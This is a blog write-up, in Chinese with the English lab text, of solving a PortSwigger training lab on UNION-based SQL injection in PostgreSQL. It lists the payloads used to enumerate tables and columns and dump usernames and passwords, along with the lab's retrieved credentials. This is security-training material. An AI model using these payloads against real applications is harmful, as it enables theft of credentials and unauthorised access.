---
layout: post
title: "SQL injection attack, listing the database contents on non-Oracle databases"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_SQL_Injection
author: ""
tags: ['PortSwigger_Lab', 'SQL_Injection']
---





# SQL injection attack, listing the database contents on non-Oracle databases



```

This lab contains an [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

#### Hint

You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

Use Burp Suite to intercept and modify the request that sets the product category filter.

Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
'+UNION+SELECT+'abc','def'--

Use the following payload to retrieve the list of tables in the database:
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
Find the name of the table containing user credentials.

Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_na




本實驗室在產品類別過濾器中包含一個 [SQL 注入](https://portswigger.net/web-security/sql-injection) 漏洞。查詢的結果會在應用程序的響應中返回，因此您可以使用 UNION 攻擊從其他表中檢索數據。

該應用程序具有登錄功能，並且數據庫包含一個保存用戶名和密碼的表。您需要確定該表的名稱及其包含的列，然後檢索表的內容以獲得所有用戶的用戶名和密碼。

要解決實驗室問題，請以“管理員”用戶身份登錄。

＃＃＃＃ 暗示

您可以在我們的 [SQL 注入備忘單](https://portswigger.net/web-security/sql-injection/cheat-sheet) 上找到一些有用的有效負載。



＃＃＃＃解法:
使用 Burp Suite 攔截和修改設置產品類別過濾器的請求。

確定查詢返回的列數以及哪些列包含文本數據。驗證查詢是否返回兩列，這兩列都包含文本，在 category 參數中使用如下所示的有效負載：
'+UNION+SELECT+'abc','def'--

使用以下負載來檢索數據庫中的表列表：
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
查找包含用戶憑據的表的名稱。

使用以下負載（替換錶名）來檢索表中列的詳細信息：
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_na





```

GET
```
category=Accessories
```


常見註釋符:
https://portswigger.net/web-security/sql-injection/cheat-sheet


```
' UNION SELECT NULL,NULL%23
// 失敗

' UNION SELECT NULL,NULL--
//成功

```

題目都說不是 Oracle

有可能是Microsoft  ，PostgreSQL ，MySQL



兩個都是string 
```
' UNION SELECT  @@version,'bbb'--
//失敗

' UNION SELECT version(),'bbb'--
//成功

```


PostgreSQL banner:
```
PostgreSQL 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
```


查所有表名
```sql
' UNION SELECT table_name,'bbb' from information_schema.columns--
```


據庫包含一個保存用戶名和密碼的表
找到user相關的表

我這邊找到(每個人不一樣):
```
users_zvxgvw
```


找這張表的所有欄位
```sql

' UNION SELECT column_name,'bbb' from information_schema.columns where table_name='users_zvxgvw'--
```

response:
```
username_ebjvvo
password_cqvpzb
```


從 users_zvxgvw 表 找usernam ,password 欄位的 data 
```sql
' UNION SELECT username_ebjvvo,password_cqvpzb from users_zvxgvw--
```


```
administrator
m34etu2hg69pueeg2476



carlos
8r8hncx7msnrqk41wx4d



wiener
041etzmz5izzzicde3po



```

登入 完成。


